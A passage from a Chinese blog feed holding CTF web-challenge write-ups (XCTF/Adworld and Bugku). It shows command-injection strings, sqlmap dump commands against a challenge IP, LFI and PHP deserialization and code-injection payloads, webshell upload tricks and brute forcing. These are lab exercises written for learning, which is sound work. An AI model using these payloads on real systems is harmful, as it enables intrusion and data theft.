alt="在这里插入图片描述"><br>5.disabled_button：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？<br>本题只要想办法让按钮可以按即可，查看源代码发现这一条，将其删除，按钮可以按下<br><img src="https://img-blog.csdnimg.cn/20201215202420114.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201215202546626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.weak_auth：小宁写了一个登陆验证页面，随手就设了一个密码。<br><img src="https://img-blog.csdnimg.cn/2020121520265144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便输入登录提示使用admin用户名，然后网页地址到了check.php<br><img src="https://img-blog.csdnimg.cn/20201215202759581.png" alt="在这里插入图片描述"><br>用burp抓包，send to Intruder，在Positions中先clear§，再在password的值左右Add§<br><img src="https://img-blog.csdnimg.cn/20201215205159138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>选择payloads选项，载入字典进行爆破，查看返回结果可知密码<br>7.simple_php：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。<br><img src="https://img-blog.csdnimg.cn/20201215205613779.png" alt="在这里插入图片描述"><br>进行php代码审计，php中有两种比较符号，=== 会同时比较字符串的值和类型，== 会先将字符串换成相同类型，再作比较，属于弱类型比较<br>当同时满足a==0和a时输出flag1<img src="https://img-blog.csdnimg.cn/20201215210046824.png" alt="在这里插入图片描述"><br>== 是不严格的比较,会先进行类型转换再比较 ,查看php类型比较表<a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a><br>发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的形式<br>ps：数字和字符混合的字符串转换为整数后只保留数字！<br>is_numeric() 函数用于检测类型是否为数字或数字字符串<img src="https://img-blog.csdnimg.cn/20201215210538673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8.get_post：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？<br>GET - 从指定的资源请求数据<br>POST - 向指定的资源提交要被处理的数据<br>在地址后加？分隔，a=1；用hackbar插件post data传b=2<img src="https://img-blog.csdnimg.cn/20201215211106145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9.xff_referer：X老师告诉小宁其实xff和referer是可以伪造的。<br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>用burp抓包，先xff，后发现需要referer<br>10.webshell：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。<br>一句话木马，通过蚁剑连接，发现一个flag.txt文件<img src="https://img-blog.csdnimg.cn/20201215215207985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11.command_execution:小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br>在文本框中写127.0.0.1 | find / -name “flag.txt” <img src="https://img-blog.csdnimg.cn/2020121521560195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到目录下的flag文件，打开<br><img src="https://img-blog.csdnimg.cn/20201215215709330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>12.simple_js：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )<br>输入任何密码都错误，源代码中<img src="https://img-blog.csdnimg.cn/20201215220114458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>应该是base16，写脚本<br><img src="https://img-blog.csdnimg.cn/20201215220342689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。&lt;br&gt; 本题打开网页查看源代码即得到flag&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>攻防世界高手区题解</title>
    <link href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/"/>
    <id>http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/</id>
    <published>2021-03-04T06:41:51.000Z</published>
    <updated>2021-11-05T08:29:57.737Z</updated>
    
    <content type="html"><![CDATA[<p>1.</p><p>   <img src="https://img-blog.csdnimg.cn/20201216202314127.png" alt="在这里插入图片描述"><br>   <img src="https://img-blog.csdnimg.cn/20201216202337147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>index.php还是跳回1.php，但是已经可以看到flag<br><img src="https://img-blog.csdnimg.cn/20201216202453186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><span id="more"></span><br>2.Training-WWW-Robots<img src="https://img-blog.csdnimg.cn/20201216202806313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.php_rce<img src="https://img-blog.csdnimg.cn/20201216205729539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020121620580899.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216205859471.png" alt="在这里插入图片描述"><br>ThinkPHP 5.x远程命令执行漏洞分析与复现<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a><br>目前我还看不懂（继续努力）<br>4.Web_php_include<img src="https://img-blog.csdnimg.cn/20201216211220420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>学到了很多，对一个参数的命令来显示文件包含<br><img src="https://img-blog.csdnimg.cn/20201216211328780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再用命令用参数显示含有flag的php</p><p>5.<br>.<img src="https://img-blog.csdnimg.cn/20201216211622816.png" alt="在这里插入图片描述"><br>这个题是sql注入，尝试输入一些值后没有头绪，看了WP也有点懵，就把WP放这以后再悟<br><a href="https://adworld.xctf.org.cn/task/writeup?type=web&amp;id=5417&amp;number=3&amp;grade=1&amp;page=undefined">https://adworld.xctf.org.cn/task/writeup?type=web&amp;id=5417&amp;number=3&amp;grade=1&amp;page=undefined</a></p><p>6.<img src="https://img-blog.csdnimg.cn/20201216212358878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216213857561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先点击各个选项测试，发现只有报表中心可点，此时url中有id=1字样，故使用burp爆破攻击后查看响应包，发现id为2333时，响应包长度不同，可获取flag</p><p>7.warmup<img src="https://img-blog.csdnimg.cn/20201216214753916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020121621481232.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216214835345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201216214850480.png" alt="在这里插入图片描述"><br>第二个红框中内容截取有问题，构造payload:file=source.php%253f/../../../../../ffffllllaaaagggg（这句是WP，我不太懂）<br><img src="https://img-blog.csdnimg.cn/2020121621492750.png" alt="在这里插入图片描述"><br>8.NewsCenter<br><img src="https://img-blog.csdnimg.cn/20210302161442784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到该题有一个输入框，尝试用sqlmap解决<br>1.获取注入点<br>sqlmap -u <a href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df”</p><p>2.获取数据库信息<br>sqlmap -u <a href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -dbs<br><img src="https://img-blog.csdnimg.cn/20210302161929814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.获取库内表信息<br>sqlmap -u <a href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news –tables<br><img src="https://img-blog.csdnimg.cn/20210302161958761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.获取表内字段信息<br>sqlmap -u <a href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news -T secret_table –columns<br><img src="https://img-blog.csdnimg.cn/20210302162021998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.获取字段内容，得到flag<br>sqlmap -u <a href="http://111.200.241.244:58787/">http://111.200.241.244:58787</a> –data “search=df” -D news -T secret_table -C “fl4g” –dump<br><img src="https://img-blog.csdnimg.cn/20210302162052460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9.NaNNaNNaNNaN-Batman<br>题目下载一个名为web100的附件，用firefox打开出现一个文本框，查看html代码发现eval函数，将它改为alert得到真正的源代码：<br><img src="https://img-blog.csdnimg.cn/20210302164733104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>共有5个if,第一个要求值的长度为16,将下面字符拼接得到be0f233ac7be98aa,输入提交得到flag</p><p>10.web2<br><img src="https://img-blog.csdnimg.cn/20210302165329534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明确，写下脚本：<br><img src="https://img-blog.csdnimg.cn/20210302170058635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>strrev(string): 反转字符串<br>ord(string): 返回字符串首个字符的 ASCII 值<br>chr(): 从指定的 ASCII 值返回对应的字符</p><p>11.PHP2<br><img src="https://img-blog.csdnimg.cn/20210302171551169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70"><br>url 解码是% + ascii 的十六进制，GET本来会进行一次url转码，urldecode又进行一次，即经过两次url转码得到id=%2561%2564%256d%2569%256e，在线url解码网站<a href="http://www.jsons.cn/urlcode/">http://www.jsons.cn/urlcode/</a></p><p>12.unserialize3<br><img src="https://img-blog.csdnimg.cn/20210302173801360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>public属性序列化后格式为：数据类型:属性名长度:”属性名”;数据类型:属性值长度:”属性值”<br>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}，设置属性值为2，可导致反序列化异常，即O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}，构造payload=?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}得到flag<br>PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。<br>当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()</p><p>13.upload1<br><img src="https://img-blog.csdnimg.cn/20210302174508880.png" alt="在这里插入图片描述"><br>这是web中的文件上传，尝试过后发现要求上传图片，故将一句话木马编辑完将文件类型改为jpg或png，然后用burp抓包修改文件名后缀为php，用蚁剑连接找到flag.php</p><p>20.mfw<br><img src="https://img-blog.csdnimg.cn/20210303091943745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在about中看到git，访问.git<br><img src="https://img-blog.csdnimg.cn/20210303092127480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到index文件，下载打开出现乱码，用githack工具<br><img src="https://img-blog.csdnimg.cn/20210303092310399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载后打开index.php看到源代码<br><img src="https://img-blog.csdnimg.cn/20210303092737836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是构造payload：page= ‘.system(“cat templates/flag.php”).’</p><p>23.favorite_number<br><img src="https://img-blog.csdnimg.cn/2021030309523031.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目进行一次数组比较和两次正则绕过<br>构造payload：stuff[4294967296]=admin&amp;stuff[1]=user来满足stuff[0]！=’admin’<br>再构造payload： num=12345%0a ls<br>最后用字符拼接 a=f;b=ag;c=l;tac /$a$c$b</p><p>24.lottery<br><img src="https://img-blog.csdnimg.cn/20210303101416508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个买彩票的网站，但是要买flag钱不够<br><img src="https://img-blog.csdnimg.cn/20210303101625453.png" alt="在这里插入图片描述"><br>在robots.txt发现存在.git目录，下载源码，最后在 api.php 里面发现漏洞<br><img src="https://img-blog.csdnimg.cn/20210303102101108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将POST数据改成 {“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]} 多发送<br>几次购买flag</p><p>28.bug<br><img src="https://img-blog.csdnimg.cn/20210303104742587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注册登录点manage需要admin用户，点击忘记密码进行修改抓包修改用户名为 admin登陆 admin 账号，点击 manager，提示 ip 问题构造 xff=127.0.0.1，获得/index.php?module=filemanager&amp;do=???感觉应该是文件上传，构造一个 jpg 文件，抓包改格式为.php5</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;1.&lt;/p&gt;
&lt;p&gt;   &lt;img src=&quot;https://img-blog.csdnimg.cn/20201216202314127.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;   &lt;img src=&quot;https://img-blog.csdnimg.cn/20201216202337147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;index.php还是跳回1.php，但是已经可以看到flag&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201216202453186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>Bugku</title>
    <link href="http://yun421.top/2021/03/04/Bugku/"/>
    <id>http://yun421.top/2021/03/04/Bugku/</id>
    <published>2021-03-04T06:40:16.000Z</published>
    <updated>2021-11-05T08:29:19.602Z</updated>
    
    <content type="html"><![CDATA[<p>web1.<img src="https://img-blog.csdnimg.cn/20210304135636453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>F12查看源代码直接搞定</p><span id="more"></span><p>web2.<img src="https://img-blog.csdnimg.cn/20210304135848918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只能输入一位，F12修改长度<br><img src="https://img-blog.csdnimg.cn/20210304135938171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web3.<br>$_GET，只要我们传递的参数为what，并且内容为flag，即可输出flag<br><img src="https://img-blog.csdnimg.cn/20210304140104456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web4.<br><img src="https://img-blog.csdnimg.cn/20210304140134966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助插件hackerbar进行一个POST传参</p><p>web5.<br><img src="https://img-blog.csdnimg.cn/20210304140238144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目要求num为1却不能是数字，这就很矛盾了，我们传一个以1开头，不能以数字结尾的字符串就行了</p><p>web6.<br><img src="https://img-blog.csdnimg.cn/2021030414044188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210304140554441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web7.<br>访问页面后它会无限刷新，我们挂一个Burp抓抓包就好了，会出现一个10.jpg的页面，这个页面的长度跟其他页面长度不同，flag就在里边<img src="https://img-blog.csdnimg.cn/20210304140733622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>web8.<br><img src="https://img-blog.csdnimg.cn/20210304140836267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始想到的是用eval执行一个file()函数，来进行文件包含，但是这里对用户的输入进行了正则过滤，所以考虑到用GLOBAS[]输出所有的全局变量<br><img src="https://img-blog.csdnimg.cn/2021030414093948.png" alt="在这里插入图片描述"></p><p>web9.<br><img src="https://img-blog.csdnimg.cn/20210304141019314.png" alt="在这里插入图片描述"><br>F12网络查看header得到flag，或者burp抓包得到</p><p>web10.<br>打开后是一个黑页，御剑扫描<br><img src="https://img-blog.csdnimg.cn/20210304141332305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问后发现需要密码，试了试一些常规的shell弱口令得到flag，密码为hack</p><p>web11.<br><img src="https://img-blog.csdnimg.cn/20210304141620919.png" alt="在这里插入图片描述"><br>base64解密得到密码</p><p><img src="https://img-blog.csdnimg.cn/20210304141512512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>burp抓包xff：127.0.0.1即可</p><p>web12.<br>var p1=’%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’;<br>var p2=’%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’;<br>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));<br>拼接urldecode解码</p><p>web13.<br>php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码，题目也说了flag在index里，如果我们直接包含index.php，程序是会把它执行的，并不会输出源码，但是我们如果利用LFI漏洞来读取index，是会读到一串加密的字符串的<br><img src="https://img-blog.csdnimg.cn/20210304142108680.png" alt="在这里插入图片描述"><br>base64解码后得到flag</p><p>web14.<br><img src="https://img-blog.csdnimg.cn/20210304142306817.png" alt="在这里插入图片描述"><br>看题目地址，提示爆破，且密码长度为5位数，一顿爆破结束</p><p>web15.<br>拿出御剑来，专门扫一下.bak这种的备份文件吧<br><img src="https://img-blog.csdnimg.cn/20210304142428939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210304142523226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>你可能会发现这俩MD5是一样的，但我们传的值是不一样的，这是因为我们的key被过滤了，这里md5()相当于加密了个空气<img src="https://img-blog.csdnimg.cn/20210304142629583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不会了</p><p>web16.<br>成绩单这一道题就是一个简单的POST注入，用burp抓个包，丢sqlmap里跑就行了<img src="https://img-blog.csdnimg.cn/20210304142802526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Sqlmap -r C:\Users\Administrator\Desktop\1.txt -p id –dump -C “skctf_flag” -T “fl4g” -D “skctf_flag”<br><img src="https://img-blog.csdnimg.cn/20210304142907716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
